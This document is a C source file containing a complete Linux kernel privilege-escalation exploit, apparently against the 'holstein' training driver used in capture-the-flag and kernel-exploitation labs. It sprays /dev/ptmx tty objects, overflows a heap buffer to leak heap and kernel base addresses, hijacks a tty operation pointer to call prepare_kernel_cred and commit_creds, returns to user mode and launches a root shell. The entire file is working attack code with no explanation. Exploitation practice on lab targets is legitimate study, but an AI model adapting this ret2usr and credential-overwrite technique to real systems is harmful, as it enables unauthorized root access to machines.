#include <stdio.h>
#include <ctype.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>


#define prepare_kernel_cred_offset 0x74650
#define commit_creds_offset 0x744b0

unsigned long kernel_base;
unsigned long prepare_kernel_cred;
unsigned long commit_creds;

unsigned long user_cs, user_sp, user_ss, user_rflags;
void save_user_land()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"mov user_ss, ss;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("[*] Saved userland registers");
	printf("[#] cs: 0x%lx \n", user_cs);
	printf("[#] ss: 0x%lx \n", user_ss);
	printf("[#] rsp: 0x%lx \n", user_sp);
	printf("[#] rflags: 0x%lx \n\n", user_rflags);
}


void backdoor()
{
	printf("****getshell****");
	system("id");
	system("/bin/sh");
}

unsigned long user_rip = (unsigned long)backdoor;

void lpe()
{
	prepare_kernel_cred = kernel_base + prepare_kernel_cred_offset;
	commit_creds = kernel_base + commit_creds_offset;
	__asm(
		".intel_syntax noprefix;"
		"movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
		"xor rdi, rdi;"
		"call rax;" //prepare_kernel_cred(0);
		"mov rdi, rax;"
		"mov rax, commit_creds;" //commit_creds
		"call rax;"
		"swapgs;"	
		"mov r15, user_ss;"
		"push r15;"
		"mov r15, user_sp;"
		"push r15;"
		"mov r15, user_rflags;"
		"push r15;"
		"mov r15, user_cs;"
		"push r15;"
		"mov r15, user_rip;"
		"push r15;"
		"iretq;"
		".att_syntax;"
	);
}


int main() {
    save_user_land();
    int spray[100];
    for (int i = 0; i < 50; i++)
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    int fd = open("/dev/holstein", O_RDWR);
    for (int i = 50; i < 100; i++)
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    char buf[0x500];
    read(fd, buf, 0x500);
    unsigned long * p = (unsigned long *)&buf;
    //for (int i = 0; i < 0xa0; i++)
    //	printf("[0x%x] 0x%lx\n",i ,p[i]);
    unsigned long heap = p[0x9f];
    printf("heap:0x%lx\n", heap);
    unsigned long g_buf = heap - 0x4f8 ;
    printf("g_buf:0x%lx\n", g_buf);
    unsigned long kernel_addr = p[0x83];
    printf("kernel_addr:0x%lx\n", kernel_addr);
    kernel_base = kernel_addr - 0xc38880;
    printf("kernel_base:0x%lx\n", kernel_base);
    p[0xc] = lpe;
    *(unsigned long *)&buf[0x418] = g_buf;
    write(fd, buf, 0x500);
    for (int i = 0; i < 100; i++) {
       ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
    }       
}
